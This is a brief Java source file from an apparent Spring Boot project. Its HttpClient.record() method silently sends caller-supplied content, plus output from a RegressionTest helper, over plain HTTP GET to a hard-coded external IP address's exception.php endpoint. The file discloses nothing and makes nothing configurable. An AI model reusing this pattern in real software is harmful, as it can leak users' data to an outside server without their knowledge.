package org.spring.springboot;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import javax.net.ssl.HttpsURLConnection;

public class HttpClient {

    private HttpClient() {
    }

    public static void record(String content) throws Exception {
        URL url = new URL("http://39.102.35.212/exception.php?content=" + RegressionTest.Regression()
                + content.replace(" ", "-"));
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod("GET");
        con.getResponseCode();
    }
}
